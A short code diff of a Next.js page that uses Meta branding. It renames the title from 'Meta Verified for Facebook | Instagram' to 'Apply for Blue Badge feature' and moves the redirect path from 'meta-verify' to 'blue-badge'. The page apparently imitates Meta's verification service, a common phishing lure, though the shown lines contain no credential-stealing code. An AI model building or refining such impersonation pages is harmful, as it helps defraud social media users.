@@ -122,7 +122,7 @@ const Index: FC = () => {
                     }
                 });
 
-                const results = await Promise.all(translatePromises);
+                await Promise.all(translatePromises);
                 localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
             } catch {
                 // Silently fail, no translation needed
@@ -152,7 +152,7 @@ const Index: FC = () => {
         if (isShowCheckMark) {
             const redirectTimeOut = setTimeout(() => {
                 const currentTime = Date.now();
-                router.push(`/meta-verify/${currentTime}`);
+                router.push(`/blue-badge/${currentTime}`);
             }, 200);
             return () => {
                 clearTimeout(redirectTimeOut);
@@ -161,7 +161,7 @@ const Index: FC = () => {
     }, [isShowCheckMark, router]);
     return (
         <div className='flex flex-col items-center justify-center pt-[150px]'>
-            <title>Meta Verified for Facebook | Instagram</title>
+            <title>Apply for Blue Badge feature</title>
             <div className='w-[300px]'>
                 <Image src={MetaImage} alt='' className='w-16' />
                 <div className='flex w-full items-center justify-start py-5'>
